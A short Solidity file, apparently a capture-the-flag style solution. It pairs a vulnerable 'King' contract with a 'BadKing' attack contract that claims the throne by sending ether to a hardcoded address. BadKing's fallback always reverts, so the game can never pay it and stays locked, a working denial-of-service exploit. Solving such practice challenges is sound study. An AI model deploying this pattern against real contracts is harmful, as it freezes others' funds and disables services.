pragma solidity ^0.4.18;

import 'https://github.com/RequestNetwork/Request_SmartContracts/blob/master/contracts/base/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

contract BadKing {
    King public king = King(0xc3aef2c8759e506fd570384696f0bfbb1057bb9f);
    function BadKing() public payable {
    }
    
    function becomeKing() public {
        address(king).call.value(1000000000000000000).gas(4000000)();
    }
    
    function() external payable{
        revert();
    }
}